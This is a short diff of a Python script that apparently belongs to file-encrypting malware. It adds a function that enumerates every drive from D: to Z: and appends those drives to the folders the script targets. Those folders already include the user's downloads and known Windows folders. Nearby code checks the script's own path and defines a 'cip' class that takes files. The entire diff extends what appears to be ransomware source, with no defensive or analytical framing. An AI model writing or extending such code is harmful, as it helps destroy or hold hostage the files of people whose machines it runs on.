@@ -32,9 +32,13 @@ if sys.argv[0] != filepath:
     except:
         pass
 
-
-
-
+def disks():
+    drives = []
+    for drive in range(ord('D'), ord('Z')+1):
+        drivename = chr(drive) + ':\\'
+        if os.path.exists(drivename):
+            drives.append(drivename)
+    return drives
  
 def getresource():
     b = ctypes.create_unicode_buffer(512)
@@ -45,10 +49,10 @@ def getresource():
 
 if "download" in os.listdir(f"C:\\Users\\{use}"):
 
-    folder = list(getresource()) +[f"C:\\Users\\{use}\\download"]
+    folder = list(getresource()) +[f"C:\\Users\\{use}\\download"]+disks()
 else:
 
-    folder = list(getresource()) 
+    folder = list(getresource()) +disks()
 
 class cip:
     def __init__(self, file):
